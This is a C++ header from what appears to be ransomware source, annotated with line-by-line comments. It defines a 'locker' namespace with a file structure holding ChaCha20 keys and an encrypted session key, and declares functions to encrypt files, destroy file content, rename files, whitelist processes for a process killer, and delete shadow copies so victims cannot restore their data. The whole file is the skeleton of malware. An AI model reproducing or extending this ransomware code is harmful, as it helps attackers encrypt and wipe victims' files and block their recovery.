// Include only once directive to avoid multiple inclusions during compilation
#pragma once

// Include the required header files
#include "common.h"
#include "chacha20/ecrypt-sync.h"
#include "queue.h"
#include "process_killer.h"

// Declare a namespace called 'locker'
namespace locker {

    // Define a structure named 'file_info'
	typedef struct file_info {

		LPCWSTR Filename;           // Pointer to a wide-character string representing the filename
		HANDLE FileHandle;          // Handle to the file
		LONGLONG FileSize;          // Size of the file
		ECRYPT_ctx CryptCtx;        // Context for the ECRYPT (presumably an encryption) process
		BYTE ChachaIV[8];           // Initialization vector for the ChaCha20 encryption
		BYTE ChachaKey[32];         // Key for the ChaCha20 encryption
		BYTE EncryptedKey[524];     // The encrypted key

	} FILE_INFO, * LPFILE_INFO;   // Define a pointer type for this structure

    // Define a list type for storing 'file_info' structures
	typedef TAILQ_HEAD(file_list, file_info) FILE_LIST, * PFILE_LIST;

    // Declare a function for encrypting file content
	BOOL Encrypt(
		__in LPFILE_INFO FileInfo,         // Information about the file to encrypt
		__in LPBYTE Buffer,                // Buffer to store the encrypted data
		__in HCRYPTPROV CryptoProvider,    // Handle to the cryptography service provider
		__in HCRYPTKEY PublicKey           // Handle to the public key used for encryption
	);

    // Declare a function for destroying file content
	BOOL Destroy(
		__in LPFILE_INFO FileInfo,   // Information about the file to destroy
		__in LPBYTE Buffer           // Buffer to store the destroyed data
	);

    // Declare a function for changing a file's name
	BOOL ChangeFileName(__in LPCWSTR OldName);

    // Declare a function for closing a file
	VOID CloseFile(__in locker::LPFILE_INFO FileInfo);

    // Declare a function for setting the white-listed processes
	VOID SetWhiteListProcess(process_killer::PPID_LIST PidList);

    // Declare a function for deleting shadow copies
	BOOL DeleteShadowCopies();

};